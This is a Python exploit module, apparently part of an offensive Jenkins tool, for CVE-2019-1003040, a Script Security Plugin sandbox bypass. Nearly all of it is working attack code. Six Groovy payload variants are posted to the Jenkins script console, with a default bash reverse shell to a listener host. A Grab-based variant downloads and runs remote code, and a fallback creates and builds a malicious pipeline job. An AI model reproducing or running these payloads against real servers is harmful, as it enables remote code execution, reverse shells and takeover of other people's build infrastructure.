"""
CVE-2019-1003040: Jenkins Script Security Plugin Constructor Invocation Bypass

This exploit leverages a bypass in the Jenkins Script Security Plugin that allows
invocation of arbitrary constructors via castToType, leading to RCE.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2019-1003040"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins Script Security Constructor Bypass",
    description="Sandbox bypass via arbitrary constructor invocation using castToType",
    affected_versions=["<= 1.55", "< 1.56"],
    mitre_attack=["T1190", "T1059", "T1059.007"],
    severity="critical",
    references=[
        "https://jenkins.io/security/advisory/2019-03-25/",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-1003040",
        "https://amlw.dev/cve/cve-2019-1003040"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["rce", "sandbox-bypass", "groovy", "constructor-injection"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/script"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        return r.status_code == 200
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2019-1003040 for sandbox bypass via castToType.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Constructor Invocation Bypass)...[/yellow]")
    
    cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')
    
    payloads = [
        f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def url = ['http://{lhost}:{lport}/'] as java.net.URL
def loader = ScriptBytecodeAdapter.castToType([url], java.net.URLClassLoader)
def engine = ScriptBytecodeAdapter.castToType([loader], javax.script.ScriptEngineManager)
''',
        f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def proc = ScriptBytecodeAdapter.castToType(["{cmd}".split(" ")], ProcessBuilder)
proc.start()
''',
        f'''
import org.kohsuke.groovy.sandbox.impl.Checker
def cmd = "{cmd}"
def proc = Checker.checkedCast(ProcessBuilder, [cmd.split(" ")], false, false, false)
proc.start()
''',
        f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def runtime = ScriptBytecodeAdapter.castToType([], Runtime)
runtime.exec("{cmd}")
''',
        f'''
@GrabConfig(disableChecksums=true)
@GrabResolver(name='exploit', root='http://{lhost}:{lport}/')
@Grab(group='pwn', module='pwn', version='1.0')
import Pwn
new Pwn()
''',
        f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def classLoader = this.class.classLoader
while (classLoader.parent != null) {{
    classLoader = classLoader.parent
}}
def clazz = classLoader.loadClass("java.lang.ProcessBuilder")
def constructor = clazz.getConstructor(String[].class)
def pb = constructor.newInstance(["{cmd}".split(" ")] as Object[])
pb.start()
'''
    ]
    
    for idx, payload in enumerate(payloads):
        console.print(f"[cyan][*] Trying payload variant {idx + 1}...[/cyan]")
        
        try:
            script_url = f"{tool.jenkins_url}/script"
            
            crumb_header = {}
            if tool.crumb:
                crumb_header[tool.crumb['crumbRequestField']] = tool.crumb['crumb']
            
            headers = {**tool.custom_headers, **crumb_header}
            
            data = {
                'script': payload
            }
            
            r = requests.post(
                script_url,
                auth=tool.auth,
                headers=headers,
                data=data,
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code == 200 and 'Result' in r.text:
                if 'RejectedAccessException' not in r.text and 'UnapprovedUsageException' not in r.text:
                    console.print(f"[green][+] Payload executed successfully (variant {idx + 1})[/green]")
                    return ExploitResult(
                        exploit=CVE_ID,
                        status="success",
                        details=f"Constructor bypass successful using castToType (variant {idx + 1})",
                        data={
                            "command": cmd,
                            "payload_variant": idx + 1,
                            "method": "castToType"
                        }
                    )
                else:
                    console.print(f"[yellow][!] Sandbox rejection (variant {idx + 1})[/yellow]")
            elif r.status_code == 403:
                console.print(f"[yellow][!] Access denied (variant {idx + 1})[/yellow]")
            else:
                console.print(f"[red][-] Variant {idx + 1} failed ({r.status_code})[/red]")
                
        except Exception as e:
            console.print(f"[red][!] Error with variant {idx + 1}: {e}[/red]")
    
    console.print("[cyan][*] Trying pipeline script method...[/cyan]")
    
    try:
        job_name = f"exploit_job_{CVE_ID.replace('-', '_')}"
        
        pipeline_payload = f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
node {{
    stage('Exploit') {{
        def cmd = "{cmd}"
        def proc = ScriptBytecodeAdapter.castToType([cmd.split(" ")], ProcessBuilder)
        proc.start()
    }}
}}
'''
        
        job_xml = f'''<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job@2.40">
  <description>CVE-2019-1003040 Exploit</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.87">
    <script>{pipeline_payload}</script>
    <sandbox>true</sandbox>
  </definition>
  <triggers/>
  <disabled>false</disabled>
</flow-definition>'''
        
        crumb_header = {}
        if tool.crumb:
            crumb_header[tool.crumb['crumbRequestField']] = tool.crumb['crumb']
        
        headers = {
            **tool.custom_headers,
            **crumb_header,
            'Content-Type': 'application/xml'
        }
        
        create_url = f"{tool.jenkins_url}/createItem?name={job_name}"
        r = requests.post(
            create_url,
            auth=tool.auth,
            headers=headers,
            data=job_xml,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code in [200, 201]:
            console.print("[green][+] Pipeline job created, triggering build...[/green]")
            
            build_url = f"{tool.jenkins_url}/job/{job_name}/build"
            r = requests.post(
                build_url,
                auth=tool.auth,
                headers=headers,
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code in [200, 201, 302]:
                return ExploitResult(
                    exploit=CVE_ID,
                    status="success",
                    details="Constructor bypass via pipeline job with castToType",
                    data={
                        "command": cmd,
                        "method": "pipeline_job",
                        "job_name": job_name
                    }
                )
                
    except Exception as e:
        console.print(f"[red][!] Pipeline method failed: {e}[/red]")
    
    return ExploitResult(
        exploit=CVE_ID,
        status="failed",
        details="All castToType exploitation methods failed"
    )
